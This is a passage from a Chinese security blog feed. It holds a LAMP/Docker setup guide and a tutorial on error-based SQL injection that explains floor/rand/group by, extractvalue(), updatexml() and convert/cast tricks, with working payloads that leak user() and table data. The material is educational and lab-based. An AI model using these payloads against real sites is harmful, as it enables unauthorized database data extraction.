<h1 id="关于WEB缓存的攻击"><a href="#关于WEB缓存的攻击" class="headerlink" title="关于WEB缓存的攻击"></a>关于WEB缓存的攻击</h1><p>不细说了，原理类似，应用环境不同 <a href="http://www.4hou.com/technology/3536.html" target="_blank" rel="external">戳这里</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">http://www.freebuf.com/articles/web/166731.html</div><div class="line">http://www.bendawang.site/2017/09/16/RPO%E4%BA%8C%E4%B8%89%E4%BA%8B/</div><div class="line">http://blog.nsfocus.net/rpo-attack/</div><div class="line">https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html</div><div class="line">https://www.tuicool.com/articles/eIf6Vje</div><div class="line">https://github.com/eboda/34c3ctf/tree/master/urlstorage</div><div class="line">https://www.secpulse.com/archives/70070.html</div><div class="line">http://www.qingpingshan.com/m/view.php?aid=240597</div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu下Apache2、Mysql、php7搭建]]></title>
      <url>/2018/04/23/Ubuntu%E4%B8%8BApache2%E3%80%81Mysql%E3%80%81php7%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<p>— LAMP搭建 —<br><a id="more"></a></p>
<h2 id="Ubuntu-下-LAMP-搭建"><a href="#Ubuntu-下-LAMP-搭建" class="headerlink" title="Ubuntu 下 LAMP 搭建"></a>Ubuntu 下 LAMP 搭建</h2><p>在docker下搭建，利用了官方ubuntu:lastest<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line"><span class="comment">#安装vim net-tools  包括netstat等</span></div><div class="line">apt-get install vim-gtk</div><div class="line">apt-get install net-tools</div><div class="line"><span class="comment">#可以更新源 详情百度</span></div><div class="line">apt-get install mysql-server</div><div class="line">service mysql start</div><div class="line">apt-get install apache2</div><div class="line">service apache2 start</div><div class="line">apt-get install php7.0 php7.0-mcrypt</div><div class="line"></div><div class="line">vim /etc/apache2/sites-available <span class="comment"># 修改网站根目录</span></div></pre></td></tr></table></figure></p>
<p>删除php7 更换php5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#移除默认已安装的PHP包</span></div><div class="line">apt-get install aptitude</div><div class="line">aptitude purge `dpkg -l | grep php| awk <span class="string">'&#123;print $2&#125;'</span> |tr <span class="string">"\n"</span> <span class="string">" "</span>`</div><div class="line"><span class="comment">#安装切换源的add-apt-repository所依赖的两个包</span></div><div class="line">apt-get install python-software-properties</div><div class="line">apt-get install software-properties-common</div><div class="line">apt-get update</div><div class="line"><span class="comment">##更新得到PPA源</span></div><div class="line">add-apt-repository ppa:ondrej/phpe</div><div class="line"><span class="comment">##出错WARNING: could not open file '/etc/apt/sources.list'</span></div><div class="line">之前改过sources.list</div><div class="line">把原来的sources.list 替换回去 就可以</div><div class="line"><span class="comment">##出错WARNING: add-apt-repository is broken with non-UTF-8 locales</span></div><div class="line">根据提示内容修改命令</div><div class="line">LC_ALL=C.UTF-8 add-apt-repository ppa:ondrej/php</div><div class="line">apt-get update</div><div class="line"><span class="comment">##安装php对应版本</span></div><div class="line">apt-get install php5.6</div><div class="line">apt-get install php5.6-gd</div><div class="line">apt-get install php5.6-mysql </div><div class="line"><span class="comment">##网速极慢...</span></div></pre></td></tr></table></figure></p>
<h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><p>当需要各种版本的php<br>事情的最后，你会发现还是phpstudy好用<br>安装：<a href="http://www.phpstudy.net/download.html" target="_blank" rel="external">phpstudy_linux</a><br>使用：<br>apache配置文件：/phpstudy/server/httpd/conf/httpd.conf<br>PHP配置文件：/phpstudy/server/php/etc/php.ini<br>打开MySQL控制台：/phpstudy/mysql/bin/mysql -uroot -proot<br>网站根目录 /phpstudy/www</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Docker使用]]></title>
      <url>/2018/04/21/docker/</url>
      <content type="html"><![CDATA[<p>— docker安装使用 —<br>— linoda/lamp使用 —<br><a id="more"></a><br>出题需要….入坑….翻滚….翻滚…..坑中来回翻滚…</p>
<h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p><a href="https://blog.csdn.net/u013814153/article/details/53925790" target="_blank" rel="external">kali下安装docker</a><br><a href="https://docs.docker-cn.com" target="_blank" rel="external">官方文档</a>(需要翻墙)</p>
<h2 id="Docker层次"><a href="#Docker层次" class="headerlink" title="Docker层次"></a>Docker层次</h2><p>仓库（Repository）—— 镜像（Image）—— 容器（Container）<br>仓库在云端，有官方有个人的很多很多镜像<br>镜像运行成为容器<br>先弄一个自己的仓库吧，可以传上去传下来<br>申请一个Docker账号，就可以有自己的仓库（虽然事后证明，因为网速问题，并不可以传上去传下来）</p>
<h2 id="Docker账号与代理"><a href="#Docker账号与代理" class="headerlink" title="Docker账号与代理"></a>Docker账号与代理</h2><p><a href="https://cloud.docker.com/" target="_blank" rel="external">申请docker账号</a>(不翻墙很慢)<br><a href="https://www.cnblogs.com/anliven/p/6218741.html" target="_blank" rel="external">代理加速</a>(文章其中的docker login的账号密码应该docker的账号和密码)</p>
<h2 id="Docker-仓库-操作"><a href="#Docker-仓库-操作" class="headerlink" title="Docker 仓库 操作"></a>Docker 仓库 操作</h2><p><code>Docker login</code>：登录个人Docker<br><code>Docker logout</code>：退出个人Docker<br><code>Docker search XXXX</code>：从官方仓库个人仓库，搜索类似的镜像 比如Docker search ubuntu</p>
<h2 id="Docker-文件-lt-–-gt-镜像-lt-–-gt-仓库"><a href="#Docker-文件-lt-–-gt-镜像-lt-–-gt-仓库" class="headerlink" title="Docker 文件&lt;–&gt;镜像&lt;–&gt;仓库"></a>Docker 文件&lt;–&gt;镜像&lt;–&gt;仓库</h2><p><code>docker push [用户/仓库：标签]</code>：推送一个镜像到个人仓库<br><code>docker pull [用户/仓库：标签]</code>：从仓库拉取一个镜像到本地<br><code>docker save -o 文件 镜像</code>：镜像输出到文件<br><code>docker load -i 文件</code>：文件读取成镜像</p>
<h2 id="通过-Dockerfile-新建Docker镜像"><a href="#通过-Dockerfile-新建Docker镜像" class="headerlink" title="通过 Dockerfile 新建Docker镜像"></a>通过 Dockerfile 新建Docker镜像</h2><p>在拥有Dockerfile的文件夹下运行<br><code>docker build [options] PATH/URL</code></p>
<ul>
<li>-t images_name:指定镜像名字</li>
<li>-f:指定Dockerfile文件，如果没有，默认在上下文中</li>
<li>PATH/URL：指定本地上下文路径，或远程Dockerfile<br>关于Dockerfile的语法，在本文最后总结，这个比较难</li>
</ul>
<h2 id="Docker镜像-操作"><a href="#Docker镜像-操作" class="headerlink" title="Docker镜像 操作"></a>Docker镜像 操作</h2><p><code>docker images</code>：查看本地镜像<br><code>docker rmi &lt;image_name&gt;</code>:删除本地镜像</p>
<h2 id="docker镜像-–-gt-容器"><a href="#docker镜像-–-gt-容器" class="headerlink" title="docker镜像 –&gt; 容器"></a>docker镜像 –&gt; 容器</h2><p><code>docker run 镜像ID / 仓库名：标签名</code>:通过本地镜像生成容器<br>参数：</p>
<ul>
<li>-i:以交互模式运行容器</li>
<li>-d:容器在后台运行</li>
<li>-t:启动后进入命令行</li>
<li>-p:端口映射</li>
<li>-v：挂载文件，可以在外面操作里面的文件</li>
</ul>
<p>此外：<br>后面一般跟一个<code>/bash/bin</code>这是表示载入容器后运行bash。<br>docker中必须要保持一个进程的运行，要不然整个容器就会退出。<br>有的镜像 不跟就会直接退出</p>
<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>端口映射：使用<code>-p</code>参数会分配宿主机的端口映射到虚拟机<br><code>docker run -p ip:hostPort:containerPort</code><br>ip：宿主机的ip地址<br>hostPort：宿主机需要映射的端口<br>containerPort：虚拟机的端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -p 127.0.0.1:3306:3306，映射本机的3306端口到虚拟机的3306端口。</div></pre></td></tr></table></figure>
<h3 id="检查端口"><a href="#检查端口" class="headerlink" title="检查端口"></a>检查端口</h3><p><code>docker port cortainerid</code>：查看容器端口映射情况</p>
<h2 id="Docker-容器文件-lt-–-gt-容器–-gt-镜像-仓库"><a href="#Docker-容器文件-lt-–-gt-容器–-gt-镜像-仓库" class="headerlink" title="Docker 容器文件&lt;–&gt;容器–&gt;镜像/仓库"></a>Docker 容器文件&lt;–&gt;容器–&gt;镜像/仓库</h2><p><code>docker commit [参数] 容器ID [用户/仓库：标签]</code>：把容器固化成镜像<br>参数：</p>
<ul>
<li>-m 说明 </li>
<li>-a 作者信息</li>
</ul>
<p><code>docker import -m &quot;message&quot; file|URL 名称</code>：从文件读入<br><code>docker export -m &quot;message&quot; file|URL 名称</code>：读出到文件</p>
<h2 id="Docker容器-操作"><a href="#Docker容器-操作" class="headerlink" title="Docker容器 操作"></a>Docker容器 操作</h2><p><code>docker exec -i -t CONTAINER ID /bin/bash</code><br>跟docker run有一点类似<br><code>docker ps</code>:查看运行中的container</p>
<ul>
<li>-a：查看所有容器包括停止状态的容器</li>
</ul>
<p><code>docker start CONTAINER ID</code><br><code>docker stop CONTAINER ID</code><br><code>docker restart CONTAINER ID</code><br><code>ctrl + p then ctrl + q</code>:挂起正在运行中的容器的命令行<br><code>docker attach CONTAINER ID</code>:链接正在运行的挂起容器<br><code>docker rm &lt;CONTAINER_ID/CONTAINER_NAME&gt;</code>:删除容器<br>ps.CONTAINER ID:容器ID，可以缩写，即前几位</p>
<h2 id="Docker容器-lt-–-gt-本机-传输文件"><a href="#Docker容器-lt-–-gt-本机-传输文件" class="headerlink" title="Docker容器 &lt;–&gt; 本机 传输文件"></a>Docker容器 &lt;–&gt; 本机 传输文件</h2><p><code>docker cp 本地文件路径 ID全称:容器路径</code><br><code>docker cp ID全称:容器文件路径 本地路径</code></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fqjgynt734j30sg0lcdi0.jpg" alt="docker"></p>
<h2 id="Dockerfile-命令"><a href="#Dockerfile-命令" class="headerlink" title="Dockerfile 命令"></a>Dockerfile 命令</h2><p><strong>FROM 指定基础镜像</strong><br>格式：<code>FROM &lt;image&gt;/&lt;image&gt;:&lt;tag&gt;</code></p>
<p><strong>MAINTAINER 指定维护者信息</strong><br>格式：<code>MAINTAINER image_creator@docker.com</code><br>该信息会写入生成镜像的Author属性域中</p>
<p><strong>WORKDIR 指定容器工作目录</strong><br>格式：<code>WORKDIR /path</code></p>
<p><strong>COPY 复制文件</strong><br>格式：<code>COPY &lt;源路径&gt; &lt;目标路径&gt;</code></p>
<ul>
<li>源路径：在上下文目录中，为上下文根目录的相对路径</li>
<li>目标路径：可以是容器内绝对路径，也可以是相对于工作目录的相对路径</li>
</ul>
<p><strong>ADD 高级复制文件</strong><br>格式：<code>ADD &lt;源路径&gt; &lt;目标路径&gt;</code></p>
<ul>
<li>源路径：可以是URL，会先下载这个URL指向的文件到目标路径去取；如果是tar压缩文件，会自动解压</li>
</ul>
<p><strong>RUN 运行指定命令</strong><br>格式：<code>RUN &lt;command&gt; / RUN [&#39;executable&#39;,&quot;param1&quot;,&quot;param2&quot;]</code></p>
<ul>
<li>前者在shell中断中执行命令，即 /bin/sh -c</li>
<li>后者使用exec执行</li>
</ul>
<p>每条RUN指令将在当前镜像的基础上执行指定命令并提交为新的镜像。<br>可以命令较长，可以使用\换行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RUN apt-get update</div></pre></td></tr></table></figure></p>
<p><strong>CMD 指定启动容器时默认执行的命令</strong></p>
<ul>
<li>CMD [“executable”,”param1”,”param2”] 使用exec执行，是推荐使用的方式</li>
<li>CMD param1 param2 在/bin/sh中执行，提供给需要交互的应用；</li>
<li>CMD [“param1”,”param2”] 提供给ENTRYPOINT的默认参数。</li>
</ul>
<p>每个Dockerfile只能有一条CMD命令。如果指定了多条命令，只有最后一条会被执行。</p>
<p><strong>EXPOSE 声明端口监听</strong><br>格式：<code>EXPOSE &lt;POST&gt;</code><br>只起到声明的作用，不会自动完成端口映射。还是需要docker run -p来指定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXPOSE 22 80 443 3306 ##这些端口需要监听，即映射到外部</div></pre></td></tr></table></figure></p>
<p><a href="https://www.cnblogs.com/fengzheng/p/5181222.html" target="_blank" rel="external">其他Dockerfile命令</a></p>
<h2 id="docker下利用linoda-lamp"><a href="#docker下利用linoda-lamp" class="headerlink" title="docker下利用linoda/lamp"></a>docker下利用linoda/lamp</h2><p><a href="https://hub.docker.com/r/linode/lamp/" target="_blank" rel="external">官方文档</a><br><a href="https://blog.csdn.net/MasonQAQ/article/details/78048112?locationNum=5&amp;fps=1" target="_blank" rel="external">网上教程</a></p>
<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><code>service mysql start</code><br><code>mysql -u root -p</code><br><code>Admin2015</code></p>
<h3 id="apache2-配置文件"><a href="#apache2-配置文件" class="headerlink" title="apache2 配置文件"></a>apache2 配置文件</h3><p><code>/etc/apache2/apache2.conf</code>:apache2启动时自动读取文件<br><code>/etc/apache2/sites-enabled</code>：指向sites-available文件的符号链接<br><code>/etc/apache2/sites-available</code>：真正配置文件所在</p>
<p>如果apache上配置了多个虚拟主机，每个虚拟主机的配置文件都放在 sites-available下，那么对于虚拟主机的停用、启用就非常方便了。<br>当在sites-enabled下建立一个指向某个虚拟主机配置文件的链 接时，就启用了它；如果要关闭某个虚拟主机的话，只需删除相应的链接即可，根本不用去改配置文件。</p>
<p>删除/etc/apache2/sites-enabled下的文件<br>删除/etc/apache2/sites-available下的example什么的，修改000什么的修改网站根目录<br>restart</p>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p><code>php -v</code> 查看版本<br><code>php -m</code> 查看扩展<br>发现pdo-mysql扩展没有<br>网上一堆说重新编译，但是重新编译需要知道php安装路径，mysql安装路径，phpize一些东西，还需要下源码等<br>在别人的docker里，让人想死<br>其实<br>通过<code>apt-get install php5-mysql</code>安装即可<br><code>service apache2 restart</code></p>
]]></content>
      
        
        <tags>
            
            <tag> tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-SQL报错注入]]></title>
      <url>/2018/04/09/WEB-SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>— 从零开始的笔记 —<br>— Mysql报错注入 —<br><a id="more"></a></p>
<p>一直堆着没有写…那么现在开始整理这种在特殊情境下节省时间的注入方法吧</p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><strong>报错注入</strong>：通过报错信息来获取我们想要的信息的SQL注入利用方式。<br>其构造根据产生报错的函数而各有不同，但是目的就是执行我们输入的sql语句，并通过报错回显的方式直接输出结果。<br><strong>前提</strong>：</p>
<ul>
<li>存在sql注入点</li>
<li>需要页面有错误回显</li>
<li>利用函数没有被过滤</li>
</ul>
<p>先提一些SQL Server</p>
<h2 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h2><p>SQL Server 中的报错函数，以数据类型转换错误最为常见。CAST()函数和CONVERT()函数都不能执行四舍五入或截断操作，如果执行就会产生错误信息。</p>
<ul>
<li><strong>convert()</strong>：CONVERT() 函数可以用不同的格式显示日期/时间数据。<br><code>CONVERT(目标数据类型,内容,日期/时间输出格式)</code></li>
<li><strong>cast()</strong>：CAST()函数可以用来转换数据类型<br><code>CAST (表达式 AS 目标数据类型)</code>  </li>
</ul>
<p>利用如下（强行换行为了看清楚）：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'root'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'root'</span> </div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="keyword">convert</span>(<span class="built_in">int</span>,(<span class="keyword">select</span> top <span class="number">1</span> users.username <span class="keyword">from</span> <span class="keyword">users</span>))</div><div class="line"></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'root'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'root'</span> </div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> users.username <span class="keyword">from</span> <span class="keyword">users</span>)，<span class="built_in">int</span>)</div></pre></td></tr></table></figure></p>
<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>Mysql报错函数很多，下面一种种进行说明以及演示</p>
<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p>说是floor()报错，但实际上这个报错floor()只是其中的一小环，需要联合rand()，group by 一起使用。</p>
<ul>
<li><strong>floor()</strong>:floor(num)函数只返回num整数部分，小数部分舍弃。</li>
<li><strong>rand()</strong>:rand()可以产生一个随机的0-1的数字;rand()括号中给予参数，就可以相当于给了一个伪随机数的种子，伪随机数种子不变，那么接下来产生的随机数是固定的。</li>
<li><strong>group by</strong>：group by 列名/列号，实现产生列名相同的合并成一行的临时表，然后从临时表中查询，如果从一个合并后有多个值的字段中查询，只会显示第一个。但可以对所有使用聚合函数，详情戳<a href="https://blog.csdn.net/hao1066821456/article/details/69556644" target="_blank" rel="external">=w=</a></li>
</ul>
<h3 id="报错利用"><a href="#报错利用" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> </div><div class="line">(</div><div class="line">    <span class="keyword">select</span></div><div class="line">          <span class="keyword">count</span>(*),      # 必不可少 别忘了<span class="string">','</span></div><div class="line">          <span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) x  # <span class="keyword">user</span>()可以替换为需要查询的<span class="keyword">select</span>语句，要求返回一行；构成临时表x</div><div class="line">    <span class="keyword">from</span></div><div class="line">          information_schema.TABLES   #随意指定一张存在的表，权限可以<span class="keyword">SELECT</span>，行数必须&gt;=<span class="number">3</span>，之后说明</div><div class="line">    <span class="keyword">group</span> <span class="keyword">by</span></div><div class="line">          x       # 调用临时表x</div><div class="line">) a; #构成临时表</div></pre></td></tr></table></figure>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0ixscjj30bl05eaa5.jpg" alt="2.png"><br>也可以换一个姿势<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> </div><div class="line">(</div><div class="line">    <span class="keyword">select</span></div><div class="line">          <span class="keyword">count</span>(*)</div><div class="line">    <span class="keyword">from</span></div><div class="line">          information_schema.TABLES</div><div class="line">    <span class="keyword">group</span> <span class="keyword">by</span></div><div class="line">          <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> lesson1 <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))      </div><div class="line">) <span class="keyword">as</span> a;</div></pre></td></tr></table></figure></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0c65quj30aq05e0st.jpg" alt="1.png"></p>
<blockquote>
<p>ps.报错结果中最后的1 是由floor(rand(0)*2)产生的</p>
</blockquote>
<h3 id="复杂的原理"><a href="#复杂的原理" class="headerlink" title="复杂的原理"></a>复杂的原理</h3><p>关于 group by 与 rand() 在一起会产生蜜汁化学反应,对此官网有提到：</p>
<blockquote>
<p>Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result.<br>按照ORDER BY或GROUP BY子句的顺序使用RAND（）值的列可能会产生意想不到的结果，因为对于任一子句，RAND（）表达式都可以被多次评估，每次返回一个不同的结果。</p>
<p>对于这种蜜汁化学反应，网上大部分对报错注入的说明都是rand()产生的值被当做主键放入临时表中，至于它为什么不是被当做列号处理，和其他参数有啥区别…以及究竟具体情况是如何的，网上没有找到更详细的说明，虽然有关于group的底层实现，请原谅老朽才学疏浅，无法看懂。</p>
</blockquote>
<p>所以可以先建立一个可以解释原理的观念：rand() 放在group by 后时，<strong>rand产生的值被当做主键放入临时表中</strong></p>
<p>接下来解释文档中提到的<strong>多次评估</strong>，同时说明当select count(*) group by rand()在一起时操作的流程：</p>
<ul>
<li>1.group by 会产生一张临时表</li>
<li>2.查询原表的一行,按照group by的rand()判断，此时计算一次rand()</li>
<li>3.判断 rand()计算结果 作为的主键是否已经存在在临时表中</li>
<li>4.若已经存在，count(*)结果+1。返回步骤2</li>
<li>5.若不存在，向临时表中插入这行数据，此时计算一次rand()</li>
<li>6.按照 rand()计算结果 作为的主键写入临时表。返回步骤2</li>
</ul>
<p>这么一看可能有点复杂，但是可以分析得出：如果判断主键存在，rand()只需要计算<strong>一次</strong>，如果判断主键不存在，rand()总共要计算两次。<br>此时的流程为：<code>---rand计算---判断---rand计算---插入---</code></p>
<p>同时，我们知道rand()的值是会变化的，如果rand计算一次，判断主键是不存在了，rand第二次计算时的结果作为插入的主键又已经存在于临时表中，会发生什么？自然就是我们之前看到的报错了。</p>
<p><strong>floor(rand(0)*2)</strong>正是特意构造的这么一串”随机数”</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fq6n0udra5j304207hweb.jpg" alt="4.png"></p>
<p>下面将 <strong>floor(rand(0)*2)</strong> 替代 <strong>rand()</strong>，按照”随机数”的值看下执行流程</p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0n86ptj30jl066dg0.jpg" alt="3.png"></p>
<p>最后报错成功，这里我们也可以解决之前的疑问，为什么必须有三行数据才行，因为三行数据才能触发错误。</p>
<p>由于是主键重复，一行错误触发是不可能的，有没有可能两行来触发呢？<br>根据原理只要找到随机种子生成的随机数是<strong>1101,0010,0101,1010</strong>都可以</p>
<p>随便凑了一下，发现 -7 可以</p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n0z7mc4j303n02r742.jpg" alt="5.png"></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n12xkq1j30bb063wef.jpg" alt="6.png"></p>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n17acqfj30d90a23yz.jpg" alt="7.png"></p>
<p>success! </p>
<p>还有不懂<a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="external">戳这里</a></p>
<p>floor在Mysql 5.0 可以使用<br>以下的函数在MySQL 5.1.5以后可以使用：</p>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p><strong>extractvalue()</strong>:用来解析XML数据，从目标XML中返回包含所查询值的字符串<br><code>EXTRACTVALUE (XML_document, XPath_string);</code><br>XML_document：String格式，为XML文档对象的名称或文档内容<br>XPath_string：Xpath格式的字符串<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> ExtractValue(<span class="string">'&lt;a&gt;&lt;b/&gt;&lt;/a&gt;'</span>, <span class="string">'count(/a/b)'</span>);</div><div class="line"><span class="keyword">SELECT</span> extractvalue(doc,<span class="string">'/book/author/initial'</span>);</div></pre></td></tr></table></figure></p>
<h3 id="报错利用-1"><a href="#报错利用-1" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x2e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))))</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">'.'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))))</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x2e</span>,(<span class="keyword">select</span> <span class="keyword">type</span> <span class="keyword">from</span> lesson2 <span class="keyword">limit</span> <span class="number">1</span>))))</div></pre></td></tr></table></figure>
<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n1cw8wbj309105ejri.jpg" alt="8.png"></p>
<p>注意<code>limit 1</code></p>
<p>通过报错信息显而易见，语法错误<br>使用concat()是因为，可以在前面加入字符导致xpath格式非法<br>此处有点奇怪，当使用<strong>0x5c(/)</strong>读取user()时，第一个字符会不见；<br>当使用数字1，读取数字不会报错<br>换成<strong>0x2e(.)</strong>都可以成功，就都用0x2e吧，到时候在更根据情况修改</p>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p><strong>updatexml()</strong>:更新XML，改变文档中符合条件的节点的值<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">update</span> x <span class="keyword">set</span> doc=updatexml(doc,<span class="string">'/book/author/initial'</span>,<span class="string">'!!!'</span>);</div></pre></td></tr></table></figure></p>
<h3 id="报错利用-2"><a href="#报错利用-2" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x5e24</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5e24</span>),<span class="number">1</span>))</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x5e24</span>,(<span class="keyword">select</span> <span class="keyword">type</span> <span class="keyword">from</span> lesson2 <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">0x5e24</span>),<span class="number">1</span>))</div></pre></td></tr></table></figure>
<p>注意<code>limit 1</code></p>
<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n1g1ozyj309w05emx8.jpg" alt="9.png"></p>
<p>原理相同</p>
<h2 id="GeometryCollection"><a href="#GeometryCollection" class="headerlink" title="GeometryCollection()"></a>GeometryCollection()</h2><p>GeometryCollection()：可以建立一个保存任意类型的空间数据<br>不深入</p>
